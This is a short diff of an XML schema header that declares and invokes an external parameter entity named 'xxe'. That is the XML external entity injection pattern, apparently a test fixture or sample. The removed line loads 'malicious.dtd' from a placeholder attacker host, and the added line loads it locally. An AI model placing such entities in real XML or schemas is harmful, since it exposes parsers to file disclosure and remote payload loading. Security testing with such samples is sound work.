@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE xs:schema [
-  <!ENTITY % xxe SYSTEM "http://attacker.example.com/malicious.dtd">
+  <!ENTITY % xxe SYSTEM "malicious.dtd">
   %xxe;
 ]>
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
